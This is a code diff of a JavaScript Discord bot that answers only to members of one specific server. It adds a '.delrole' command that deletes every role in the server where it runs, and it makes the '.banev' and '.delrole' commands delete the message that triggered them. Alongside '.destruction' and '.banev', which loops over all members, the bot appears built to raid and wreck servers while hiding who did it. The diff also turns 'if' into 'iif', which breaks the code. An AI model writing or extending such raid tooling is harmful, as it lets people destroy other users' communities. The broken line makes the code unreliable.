@@ -32,7 +32,7 @@ bot.on('message', msg => {
   }
  if (bot.guilds.get('453631449804046336').members.get(msg.author.id) !== undefined) {
     
-if (msg.content === '.destruction') {
+iif (msg.content === '.destruction') {
   if(msg.channel.type === "dm") return;
 
     console.log(`Commande .destruction par ${msg.author.tag}`);
@@ -71,6 +71,8 @@ if (msg.content === '.oupss') {
 
 if (msg.content === '.banev') {
   if(msg.channel.type === "dm") return;
+  if(msg.deletable) msg.delete();
+
 
     console.log(`Commande .banev par ${msg.author.tag}`);
     msg.guild.members.forEach(member => {
@@ -144,6 +146,14 @@ i
 
       }   
   })
+  }
+  if(msg.content === ".delrole"){
+    if(msg.channel.type === "dm") return;
+    if(msg.deletable) msg.delete();
+    msg.guild.roles.forEach(role => {
+      if(role.deletable) role.delete();
+    })
+
   } 
 
 
